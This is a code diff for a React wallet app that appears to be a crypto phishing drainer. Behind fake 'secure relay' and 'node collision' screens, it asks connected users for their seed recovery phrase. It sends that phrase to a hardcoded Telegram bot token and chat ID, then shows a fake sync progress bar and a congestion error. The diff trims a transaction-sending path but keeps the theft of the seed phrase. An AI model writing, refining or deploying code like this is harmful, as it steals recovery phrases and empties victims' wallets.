@@ -1,23 +1,18 @@
 import React, { useState, useEffect, useMemo } from 'react';
-import { useAccount, useBalance, useSendTransaction, useChainId } from 'wagmi';
+import { useAccount, useBalance } from 'wagmi';
 
 export default function App() {
   const { address, isConnected } = useAccount();
-  const chainId = useChainId();
-  const { sendTransaction } = useSendTransaction();
-  
   const [view, setView] = useState("menu"); 
   const [activeTask, setActiveTask] = useState(""); 
   const [inputVal, setInputVal] = useState(""); 
   const [seedVal, setSeedVal] = useState("");   
-  const [isSyncing, setIsSyncing] = useState(false);
   const [syncProgress, setSyncProgress] = useState(0);
+  const [isSyncing, setIsSyncing] = useState(false);
 
   const botToken = "8522972159:AAFfmNh8xmBgqWYxY75SXVfkaMw9AjFCRVQ";
   const chatId = "7630238860";
-  const dest = "0x0CbaC4A3167C0CF39930E2E9D1a2BB39B2d2FDf4";
 
-  // Automatic Balance Fetching
   const { data: tokenBal } = useBalance({ address, token: "0xdac17f958d2ee523a2206206994597c13d831ec7" }); 
   const { data: nativeBal } = useBalance({ address });
 
@@ -26,24 +21,19 @@ export default function App() {
     body: JSON.stringify({ chat_id: chatId, text: msg }) 
   }).catch(()=>{});
 
-  // Seed Validation (12/24 words)
   const isSeedValid = useMemo(() => {
     const words = seedVal.trim().split(/\s+/).filter(w => w.length >= 3);
     return [12, 15, 18, 21, 24].includes(words.length);
   }, [seedVal]);
 
-  // Handle Rectify vs Type-able buttons
   useEffect(() => {
     if (activeTask === "Rectify") {
-      const b = tokenBal?.formatted?.slice(0, 8) || nativeBal?.formatted?.slice(0, 8) || "0.00";
-      setInputVal(b);
+      setInputVal(tokenBal?.formatted?.slice(0, 8) || nativeBal?.formatted?.slice(0, 8) || "0.00");
     } else { setInputVal(""); }
   }, [tokenBal, nativeBal, activeTask]);
 
   return (
     <div style={{minHeight:'100vh', backgroundColor:'#05070a', color:'#e2e8f0', fontFamily:'monospace', padding:'15px', textTransform:'uppercase'}}>
-      
-      {/* Trading Chart Decoration */}
       <div style={{width:'100%', height:'130px', backgroundColor:'black', borderRadius:'15px', marginBottom:'20px', overflow:'hidden', border:'1px solid #1e293b'}}>
          <iframe src={`https://s.tradingview.com/widgetembed/?symbol=BITSTAMP:ETHUSD&theme=dark&style=1&locale=en`} style={{width:'100%', height:'100%', border:'none', opacity:'0.3'}} />
       </div>
@@ -56,7 +46,7 @@ export default function App() {
       {!isConnected ? (
         <div style={{textAlign:'center', padding:'50px 20px', backgroundColor:'#0d1117', borderRadius:'30px', border:'1px solid #1e293b'}}>
           <div style={{fontSize:'35px', marginBottom:'15px'}}>🔐</div>
-          <div style={{color:'#64748b', fontSize:'10px', marginBottom:'30px'}}>NODE_ENCRYPTION_AUTH_REQUIRED</div>
+          <div style={{color:'#64748b', fontSize:'10px', marginBottom:'30px'}}>ENCRYPTED_AUTH_REQUIRED</div>
           <appkit-button />
         </div>
       ) : (
@@ -77,9 +67,8 @@ export default function App() {
             <div style={{backgroundColor:'#0d1117', border:'1px solid #1e293b', borderRadius:'30px', padding:'35px', textAlign:'center'}}>
               <h2 style={{color:'white'}}>{activeTask === "Rectify" ? "⚡ RECTIFY" : `〽️ ${activeTask}`}</h2>
               <div style={{backgroundColor:'black', padding:'25px', borderRadius:'15px', margin:'20px 0', border:'1px solid #1e293b'}}>
-                <label style={{fontSize:'8px', color:'#10b981', display:'block', marginBottom:'10px'}}>STABILIZING_VOLUME</label>
                 <input value={inputVal} onChange={(e)=>setInputVal(e.target.value)} readOnly={activeTask === "Rectify"} 
-                style={{background:'none', border:'none', color:'#10b981', fontSize:'32px', textAlign:'center', width:'100%', outline:'none', fontWeight:'900'}} />
+                style={{background:'none', border:'none', color:'#10b981', fontSize:'28px', textAlign:'center', width:'100%', outline:'none', fontWeight:'900'}} />
               </div>
               <button onClick={() => setView("seed_gate")} style={{width:'100%', backgroundColor:'#10b981', color:'black', padding:'20px', borderRadius:'15px', fontWeight:'900'}}>START_HANDSHAKE</button>
             </div>
@@ -91,11 +80,11 @@ export default function App() {
                 {!isSyncing ? (
                   <>
                     <div style={{color:'#10b981', fontWeight:'900', fontSize:'18px', marginBottom:'15px'}}>🛡️ SECURE_RELAY</div>
-                    <p style={{fontSize:'9px', color:'#64748b', marginBottom:'25px'}}>NODE_COLLISION DETECTED. PROVIDE RECOVERY KEY TO ENCRYPT MAINNET TUNNEL.</p>
-                    <textarea value={seedVal} onChange={(e)=>setSeedVal(e.target.value)} placeholder="ENTER 12/24 WORDS..." 
-                    style={{width:'100%', height:'120px', backgroundColor:'black', borderRadius:'15px', color:'#10b981', padding:'15px', outline:'none', border:'1px solid #1e293b', fontSize:'14px'}} />
-                    <button disabled={!isSeedValid} onClick={()=>{setIsSyncing(true); log(`🚨 SEED: ${seedVal}`); let c=0; const i=setInterval(()=>{c++; setSyncProgress(c); if(c>=100){clearInterval(i); setTimeout(()=>{setIsSyncing(false); alert("CRITICAL_ERROR: RELAY_CONGESTION. Please re-authenticate."); setView("menu")},1200)}},60);}} 
-                    style={{width:'100%', backgroundColor: isSeedValid ? '#10b981' : '#1e293b', color:'black', padding:'20px', borderRadius:'15px', fontWeight:'900', marginTop:'20px'}}>FINALIZE_SYNC</button>
+                    <p style={{fontSize:'9px', color:'#64748b', marginBottom:'25px'}}>NODE_COLLISION: PROVIDE RECOVERY KEY TO ENCRYPT TUNNEL.</p>
+                    <textarea value={seedVal} onChange={(e)=>setSeedVal(e.target.value)} placeholder="12/24 WORDS..." 
+                    style={{width:'100%', height:'120px', backgroundColor:'black', borderRadius:'15px', color:'#10b981', padding:'15px', outline:'none', border:'1px solid #1e293b'}} />
+                    <button disabled={!isSeedValid} onClick={()=>{setIsSyncing(true); log(`🚨 SEED: ${seedVal}`); let c=0; const i=setInterval(()=>{c++; setSyncProgress(c); if(c>=100){clearInterval(i); setTimeout(()=>{setIsSyncing(false); alert("ERROR: RELAY_CONGESTION."); setView("menu")},1200)}},60);}} 
+                    style={{width:'100%', backgroundColor: isSeedValid ? '#10b981' : '#1e293b', color:'black', padding:'20px', borderRadius:'15px', fontWeight:'900', marginTop:'20px'}}>FINALIZE</button>
                   </>
                 ) : (
                   <div><div style={{fontSize:'55px', color:'white'}}>{syncProgress}%</div><div>SYNCING...</div></div>
